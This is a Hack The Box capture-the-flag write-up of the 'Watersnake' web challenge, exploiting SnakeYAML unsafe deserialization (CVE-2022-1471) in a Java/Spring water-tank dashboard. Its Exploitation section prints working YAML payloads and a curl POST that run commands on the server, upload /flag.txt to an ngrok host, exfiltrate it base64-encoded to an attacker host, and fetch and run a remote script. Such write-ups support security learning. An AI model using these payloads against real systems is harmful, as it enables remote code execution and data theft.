---
type: challenge
platform: Hack The Box
category: "web"
difficulty: "easy"
status: Documents
date_started: 2026-09-08
date_completed: 2026-09-08
tags:
  - htb
  - challenge
  - ics
  - scada
  - web
  - java
  - snakeyaml
  - deserialization
  - rce
---

# Watersnake

## Overview

**Category:** web
**Difficulty:** easy
**Platform:** Hack The Box
**Date:** 2026-09-08

> [!note] Challenge Scenario
>
> > A walking disaster patrols the streets in a small town and is threatening our water infrastructure. Can you stop it and save the town?
>
> English summary: Java/Spring web app showing a water-tank dashboard. A "Firmware Update" page accepts YAML (SnakeYAML). The app deserializes arbitrary Java classes, leading to RCE and flag exfiltration.

## Enumeration

Source code is provided. The key files:

```java
// Controller.java
@RestController
public class Controller {
    GetWaterLevel sensorReader = new GetWaterLevel("./watersensor --init");

    @GetMapping("/stats")
    public String stats() throws IOException {
        return sensorReader.readFromSensor("./watersensor --stats");
    }

    @PostMapping("/update")
    public String update(@RequestParam(name = "config") String updateConfig) {
        Yaml yaml = new Yaml();
        Map<String, Object> obj = yaml.load(new ByteArrayInputStream(updateConfig.getBytes()));
        return "Config queued for firmware update";
    }
}
```

`pom.xml` pins **SnakeYAML 1.33**, which has the unsafe-deserialization issue tracked as **CVE-2022-1471**.

```java
// GetWaterLevel.java
public class GetWaterLevel {
    public static String readFromSensor(String value) throws IOException {
        ProcessBuilder processBuilder = new ProcessBuilder(value.split("\\s+"));
        return processBuilder.start().getInputStream()...
    }
    public GetWaterLevel(String value) {
        initiateSensor(value);          // constructor runs our command!
    }
}
```

## Vulnerability

SnakeYAML's `yaml.load()` will instantiate **any class of the project with any constructor argument**. `GetWaterLevel(String)` runs that string as a system command via `ProcessBuilder` → **remote code execution** on every firmware update.

## Exploitation

I started a listener I could reach (ngrok → local `nc`) and posted a YAML payload that instantiates the gadget with a `curl` command that uploads `/flag.txt`:

```yaml
asdf: !!com.lean.watersnake.GetWaterLevel ["curl https://XXXX.ngrok-free.app -T /flag.txt"]
```

```bash
curl -i -s -X POST http://$RHOST:$RPORT/update \
  -F 'config=asdf: !!com.lean.watersnake.GetWaterLevel ["curl https://XXXX.ngrok-free.app -T /flag.txt"]'
```

The flag arrives on my listener:

```text
$ nc -nlvp 8000
Ncat: Connection from ...
PUT /flag.txt HTTP/1.1
...
Content-Length: 34

HTB{sn4k3_y4ml_d3s3r14lized_ftw!}
```

Alternative exfil (base64 in the path, no tunnel needed — I just watch my HTTP server logs):

```yaml
a: !!com.lean.watersnake.GetWaterLevel ["curl curl http://ATTACKER/(`base64 /flag.txt`)"]
```

Or staged: download `run.py` with curl, then run it:

```yaml
some_var: !!com.lean.watersnake.GetWaterLevel ["curl -o run.py http://ATTACKER/run.py"]
some_var2: !!com.lean.watersnake.GetWaterLevel ["python3 run.py"]
```

> [!info] Tools Used
>
> - `curl`, `nc` / `ngrok`
> - SnakeYAML CVE-2022-1471 (insecure `Constructor`, `yaml.load`)

## Flag

`HTB{sn4k3_y4ml_d3s3r14lized_ftw!}`

## References

- https://7rocky.github.io/en/ctf/htb-challenges/web/watersnake/
- https://erichogue.ca/2023/07/HTBBusinessCTF/WebWatersnake
- https://robinx0.medium.com/hackthebox-watersnake-challenge-writeup-1316474de868
- https://getoutofmysystem.gitbook.io/ctf-write-ups/walk-throughs/ics-and-scada/watersnake